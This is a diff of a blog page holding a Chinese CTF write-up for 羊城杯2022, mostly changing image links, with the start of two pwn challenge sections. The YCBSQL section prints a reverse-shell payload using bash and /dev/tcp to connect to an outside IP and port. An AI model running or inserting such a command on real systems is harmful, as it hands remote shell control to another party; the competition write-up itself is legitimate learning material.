@@ -7,14 +7,15 @@
 <p>​                                                                                                                            -------TWe1v3、1amfree、scr1pt_k1ddi3</p>
 <hr>
 <p>这个比赛太累了可，凌晨三点碰着枕头就睡着了，不过收获也蛮多的，这次题目很友好，不像wmCTF一样坐大牢。感谢两位大哥的实力带飞，太菜了我。全靠躺。</p>
-<span id="more"></span>                      ![1280X1280](D:\TWe1v3's blog\Hexo\blog\source\_posts\羊城杯2022-Writeup\1280X1280.PNG)
+<span id="more"></span>          
+<p>​            <img src="/images/1280X1280.png" alt="1280X1280"></p>
 <h2 id="pwn"><a class="markdownIt-Anchor" href="#pwn"></a> Pwn</h2>
 <h3 id="ycbsql"><a class="markdownIt-Anchor" href="#ycbsql"></a> YCBSQL</h3>
 <p>这个应该是有了非预期，可以直接调用shell，我们直接反弹就行。</p>
-<p>![1280X1280 (1)](D:\TWe1v3’s blog\Hexo\blog\source_posts\羊城杯2022-Writeup\1280X1280 (1).PNG)</p>
+<p><img src="/images/1.PNG" alt="1"></p>
 <p>Payload:</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">.system bash -c <span class="string">&quot;bash -i  &gt;&amp;/dev/tcp/101.43.255.238/7777 0&gt;&amp;1&quot;</span></span><br></pre></td></tr></table></figure>
-<p>![1280X1280 (2)](D:\TWe1v3’s blog\Hexo\blog\source_posts\羊城杯2022-Writeup\1280X1280 (2).PNG)</p>
+<p><img src="/images/2.PNG" alt="2"></p>
 <h3 id="ez_linklist-v2"><a class="markdownIt-Anchor" href="#ez_linklist-v2"></a> ez_linklist-v2</h3>
 <p>这个题目的漏洞就是在unlink的时候如果是unlink的头指针，那么后面的指针没有清空，就会是这样：</p>
 <p>![1280X1280 (3)](D:\TWe1v3’s blog\Hexo\blog\source_posts\羊城杯2022-Writeup\1280X1280 (3).PNG)</p>
